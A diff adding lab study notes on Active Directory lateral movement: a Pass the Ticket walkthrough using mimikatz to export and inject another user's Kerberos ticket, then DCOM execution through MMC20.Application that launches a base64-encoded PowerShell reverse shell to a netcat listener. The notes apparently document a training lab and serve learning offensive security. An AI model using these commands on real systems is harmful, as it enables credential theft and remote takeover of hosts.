@@ -337,3 +337,142 @@ FILES04
 ```
 
 We have successfully reused the Kerberos TGT to launch a command shell on the files04 server.
+
+### Pass the Ticket
+
+The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.
+
+Imagine we already have a session as jen and there's an existing session for dave, who has privileged access to the backup folder on WEB04.
+
+We are going to extract all the current TGT/TGS in memory and inject dave's WEB04 TGS into our own session. This will allow us to access the restricted folder.
+
+```console
+kali$ xfreerdp /cert-ignore /u:jen /v:192.168.214.76 /drive:shared,/tmp
+Password: 
+
+// see that jen doesn't have access to \\web04\backup
+
+PS C:\Users\jen> ls \\web04\backup
+ls : Access is denied
+
+PS C:\Tools> .\mimikatz.exe
+
+mimikatz #privilege::debug
+Privilege '20' OK
+
+mimikatz #sekurlsa::tickets /export
+Authentication Id : 0 ; 2037286 (00000000:001f1626)
+Session           : Batch from 0
+User Name         : dave
+Domain            : CORP
+Logon Server      : DC1
+Logon Time        : 9/14/2022 6:24:17 AM
+SID               : S-1-5-21-1987370270-658905905-1781884369-1103
+
+         * Username : dave
+         * Domain   : CORP.COM
+         * Password : (null)
+
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+
+        Group 2 - Ticket Granting Ticket
+         [00000000]
+           Start/End/MaxRenew: 9/14/2022 6:24:17 AM ; 9/14/2022 4:24:17 PM ; 9/21/2022 6:24:17 AM
+           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
+           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
+           Client Name  (01) : dave ; @ CORP.COM ( CORP )
+           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             f0259e075fa30e8476836936647cdabc719fe245ba29d4b60528f04196745fe6
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
+           * Saved to file [0;1f1626]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
+...
+
+// above command parsed the LSASS process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format
+// dave had initiated a session. We can try to inject one of their tickets inside jen's sessions.
+
+// verify newly generated tickets with dir, filtering out on the kirbi extension
+
+PS> dir *.kirbi
+Directory: C:\Tools
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/24/2024   4:30 PM           1601 [0;1035db]-0-0-40a50000-jen@LDAP-DC1.corp.com.kirbi
+-a----        4/24/2024   4:30 PM           1511 [0;1035db]-2-0-40e10000-jen@krbtgt-CORP.COM.kirbi
+-a----        4/24/2024   4:30 PM           1567 [0;1036a0]-0-0-40a10000-jen@cifs-web04.kirbi
+-a----        4/24/2024   4:30 PM           1511 [0;1036a0]-2-0-40e10000-jen@krbtgt-CORP.COM.kirbi
+-a----        4/24/2024   4:25 PM           1577 [0;158c67]-0-0-40810000-dave@cifs-web04.kirbi
+
+// many tickets have been generated, we can just pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz
+
+mimikatz # kerberos::ptt [0;158c67]-0-0-40810000-dave@cifs-web04.kirbi
+* File: '[0;158c67]-0-0-40810000-dave@cifs-web04.kirbi': OK
+
+PS C:\Tools> klist
+Current LogonId is 0:0x1035db
+
+Cached Tickets: (1)
+
+#0>     Client: dave @ CORP.COM          // !!!
+        Server: cifs/web04 @ CORP.COM    // !!!
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
+        Start Time: 4/24/2024 16:18:35 (local)
+        End Time:   4/25/2024 2:18:35 (local)
+        Renew Time: 5/1/2024 16:18:35 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+
+// dave's ticket has been imported to our own session for jen
+// now we have access to the folder!!
+
+PS C:\Tools> ls \\web04\backup
+ Directory: \\web04\backup
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        9/13/2022   5:52 AM              0 backup_schemata.txt
+-a----        4/24/2024   4:15 PM             78 flag.txt
+```
+
+### DCOM
+
+The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network. Interaction with DCOM is performed over RPC on TCP port 135 and local administrator access is required to call the DCOM Service Control Manager, which is essentially an API.
+
+The MMC Application Class allows the creation of Application Objects, which expose the ExecuteShellCommand method under the Document.ActiveView property. As its name suggests, this method allows the execution of any shell command as long as the authenticated user is authorized, which is the default for local administrators.
+
+```console
+kali$ xfreerdp /cert-ignore /u:jen /v:192.168.214.74 /drive:shared,/tmp
+
+PS> $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.214.73"))
+
+PS> $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+
+// now log onto .73
+
+PS C:\Windows\system32> tasklist | findstr "calc"
+win32calc.exe                 3512 Services                   0     12,128 K
+
+// try for shell now
+
+kali$ nc -nlvp 443
+
+// on .74
+PS> $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgA2ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=","7")
+
+// got shell from .73
+kali$ nc -nlvp 443
+connect to [192.168.45.226] from (UNKNOWN) [192.168.214.73] 55129
+PS C:\Windows\system32> hostname
+FILES04
+PS C:\Windows\system32> whoami
+corp\jen
+```
+
+## Active Directory Persistence
